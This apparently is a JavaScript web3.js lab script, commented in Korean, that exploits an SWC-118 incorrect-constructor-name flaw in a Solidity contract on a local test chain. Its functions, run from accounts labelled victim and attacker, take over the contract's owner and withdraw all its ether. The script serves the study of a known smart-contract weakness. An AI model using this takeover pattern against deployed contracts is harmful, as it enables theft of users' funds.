const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:9545"));
const swc118_json = require("../build/contracts/swc118.json")
const attack_json = require("../build/contracts/attack.json")
const swc118_abi = swc118_json['abi'];
const attack_abi = attack_json['abi'];
const _swc118 = new web3.eth.Contract(swc118_abi, "0x9E5192F1828f71213b70f01D76b4cf47BE5B3C61");
const _attack = new web3.eth.Contract(attack_abi, "0x9E5192F1828f71213b70f01D76b4cf47BE5B3C61");

// account[0] = 희생자 주소
// account[1] = 예비용 주소
// account[2] = 공격자 주소

//함수를 호출하여, 컨트랙트의 owner를 설정
async function swc118(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];

    await _swc118.methods.swc118().send({from:account1,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

//swc118 컨트랙트의 이더 값을 전부 출금
async function swc118_withdraw(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];
    await _swc118.methods.withdraw().send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

//외부 컨트랙트에서 swc118 컨트랙트를 호출하여, owner를 변경
async function attack_addrset(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];
    
    await _attack.methods.setaddr("0xd09C033BDD48729df7fD4f9A28D8d7a106C15e81","0x093A0224259989B389d56dF889d19Cb70b4F37f2").send({from:account2,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )

    await _attack.methods.attack_swc118().send({from:account2,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

//swc118 컨트랙트의 이더 값을 전부 출금
//owner가 컨트랙트 주소로 변경되어서, 값을 출금할 수 없는 상황이 발생
async function attack_swc118(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];

    await _attack.methods.attack_withdraw().send({from:account2,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}


//swc118 컨트랙트에 이더 값을 전송, 이더가 출금되는지 확인하고자 값을 계속 전송함
async function swc118_sendether(){
    const account9 = (await web3.eth.getAccounts())[9];
    await _swc118.methods.a().send({from:account9,gas:100000,gasPrice:'100000',value:web3.utils.toWei("0.1","ether")}).then(
        function(result){
            console.log(result);
        }
    )
}
swc118(); //함수를 호출하여, msg.sender를 설정하기 위함
//swc118_withdraw(); //
//attack_addrset(); //외부 컨트랙트에서 swc118 컨트랙트를 호출, 생성자를 변경하기 위함 - 안됨 onlyowner가 컨트랙트 주소로 되어버림
//attack_swc118(); //
swc118_sendether(); //account9에서 알아서 0.1씩 계속 입금

/*
swc118() > swc118_withdraw()


*/